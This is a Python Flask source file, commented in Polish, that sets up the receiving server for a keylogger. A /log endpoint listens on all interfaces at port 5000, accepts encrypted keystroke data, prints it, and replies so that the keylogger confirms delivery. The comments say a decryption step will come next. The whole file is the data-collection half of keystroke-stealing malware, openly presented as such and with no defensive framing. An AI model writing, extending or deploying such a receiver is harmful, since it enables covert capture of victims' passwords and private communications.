from flask import Flask, request, abort

# Inicjalizacja aplikacji Flask
app = Flask(__name__)

@app.route('/log', methods=['POST'])
def log_keystrokes():
    """
    Endpoint do odbierania zaszyfrowanych danych z keyloggera.
    """
    # Sprawdzamy, czy żądanie zawiera dane
    if not request.data:
        # Jeśli nie, zwracamy błąd 400 (Bad Request)
        abort(400, description="Brak danych w żądaniu.")

    # Odbieramy surowe dane binarne z żądania
    encrypted_data = request.data
    
    # Na razie po prostu drukujemy otrzymane dane w konsoli serwera.
    # W kolejnym kroku dodamy tutaj logikę deszyfrowania.
    print(f"Otrzymano zaszyfrowane dane: {encrypted_data}")
    
    # Zwracamy odpowiedź 200 (OK), aby keylogger wiedział, że dane dotarły.
    return "Dane otrzymane.", 200

if __name__ == '__main__':
    # Uruchamiamy serwer na adresie 0.0.0.0, aby był dostępny z zewnątrz
    # Używamy portu 5000 (standardowy dla Flask)
    # Wyłączamy tryb debugowania na "produkcji"
    app.run(host='0.0.0.0', port=5000, debug=False)
